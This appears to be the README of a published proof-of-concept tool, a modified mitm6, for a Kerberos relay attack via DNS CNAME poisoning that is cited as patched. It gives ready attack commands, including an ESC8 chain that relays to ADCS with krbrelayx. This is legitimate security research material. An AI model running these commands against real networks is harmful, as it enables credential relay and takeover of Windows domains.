# Kerberos Authentication Relay - CNAME Abuse Technique

A modified version of [mitm6](https://github.com/dirkjanm/mitm6) designed to support the Kerberos CNAME relay technique.

## Background

This tool is the proof-of-concept for Kerberos CNAME Abuse Relay technique,.

The research uncovered a flaw in Windows Kerberos client behavior: when a DNS CNAME record is returned, the client follows the alias and constructs the TGS request using the CNAME hostname as the SPN. This allows an attacker with DNS MITM position to coerce any domain user into requesting a Kerberos ticket for an attacker-chosen service—enabling on-demand, cross-protocol relay attacks against SMB, HTTP and other services where signing or Channel Binding is not enforced.

Unlike previous Kerberos relay techniques that were limited to machine accounts or required specific conditions (IPv6, LLMNR), this method works reliably against **user accounts** on default Windows configurations.
Microsoft mitigated the risk by applying a patch to enforce CBT on https and enable signing by default for affected protocols. The fix is traced as CVE-2026-20929
For full technical details, exploitation walkthrough, and impact analysis, see the [blog post at Cymulate](https://cymulate.com/blog/kerberos-authentication-relay-via-cname-abuse/).

## Added CNAME Abuse Features

### CNAME Poisoning

Use `--cname-source` to target a specific domain the victim attempts to access, or `--cname-source-all` to poison every DNS query. Both require `--cname` to specify the target hostname that will be used in the CNAME response (the victim will then request a TGS for this hostname).

### DNS-Only Mode

The `--only-dns` flag disables the original mitm6 DHCPv6 server and Router Advertisement functionality. This allows combining the CNAME poisoning with other MITM techniques such as ARP poisoning.

### Passthrough

The `--passthrough` option accepts a file containing domains that should resolve to their real IP addresses (format: `domain:ip` per line). Useful to maintain connectivity to critical infrastructure like Domain Controllers (experimental).

## Installation

```bash
pip install -r requirements.txt
```

## Usage

### CNAME Poisoning (All Domains)
Poison all DNS queries with a CNAME pointing to the relay target:
```bash
python mitm6-cname.py -i eth0 -d corp.local --cname-source-all --cname target.corp.local
```

### CNAME Poisoning (Specific Domain)
Only poison queries for a specific hostname:
```bash
python mitm6-cname.py -i eth0 -d corp.local --cname-source fileserver.corp.local --cname adcs.corp.local
```

### DNS-Only Mode
Skip DHCPv6/RA when using ARP poisoning for DNS MITM:
```bash
python mitm6-cname.py -i eth0 --only-dns -d corp.local --cname-source-all --cname target.corp.local
```

## Example: ESC8 Attack

```bash
# Terminal 1: CNAME poisoning
python mitm6-cname.py -i eth0 -d corp.local --cname-source-all --cname adcs.corp.local

# Terminal 2: Relay to ADCS
krbrelayx.py -t http://adcs.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template User
```

## Credits

- Original mitm6: [Dirk-jan Mollema](https://github.com/dirkjanm/mitm6)

## Tested On

- Windows 10, 11
- Windows Server 2022, 2025

## Requirements

- Python 3.x
- Linux OS

## Disclaimer

This tool is a non-production PoC provided for educational and authorized security testing purposes only. Unauthorized access to computer systems is illegal. Use at your own risk and only against systems you have explicit permission to test.

## License

MIT
